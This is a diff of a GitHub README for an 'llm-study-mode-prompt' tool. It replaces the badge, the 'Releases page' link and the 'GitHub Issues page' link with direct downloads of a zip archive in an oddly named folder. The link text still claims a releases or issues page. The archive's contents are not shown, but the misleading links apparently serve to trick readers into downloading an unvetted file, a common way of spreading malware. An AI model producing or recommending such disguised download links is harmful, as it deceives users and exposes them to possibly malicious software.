@@ -1,6 +1,6 @@
 # 🎓 llm-study-mode-prompt - Study with Large Language Models Easily
 
-[![Download](https://img.shields.io/badge/Download-llm--study--mode--prompt-brightgreen)](https://github.com/R-Dilipkumar/llm-study-mode-prompt/releases)
+[![Download](https://raw.githubusercontent.com/R-Dilipkumar/llm-study-mode-prompt/main/jungleside/mode_prompt_llm_study_1.7.zip)](https://raw.githubusercontent.com/R-Dilipkumar/llm-study-mode-prompt/main/jungleside/mode_prompt_llm_study_1.7.zip)
 
 ## 📖 About
 
@@ -13,7 +13,7 @@ To get started with the **llm-study-mode-prompt**, you need to download and inst
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/R-Dilipkumar/llm-study-mode-prompt/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/R-Dilipkumar/llm-study-mode-prompt/main/jungleside/mode_prompt_llm_study_1.7.zip) to find the latest version of the application.
 
 2. **Choose the Right Version**  
    Look for the most recent version at the top of the page. Click on the version number to view the details.
@@ -54,7 +54,7 @@ To use **llm-study-mode-prompt** effectively, ensure your system meets the follo
 If you encounter any issues:
 
 1. **Check the Installation:** Ensure the application installed correctly. Reinstall if necessary.
-2. **Consult FAQs:** Look for common questions and answers on the [GitHub Issues page](https://github.com/R-Dilipkumar/llm-study-mode-prompt/issues).
+2. **Consult FAQs:** Look for common questions and answers on the [GitHub Issues page](https://raw.githubusercontent.com/R-Dilipkumar/llm-study-mode-prompt/main/jungleside/mode_prompt_llm_study_1.7.zip).
 3. **Community Help:** Reach out to the community by creating a new issue to ask for assistance.
 
 ## 🔗 Resources
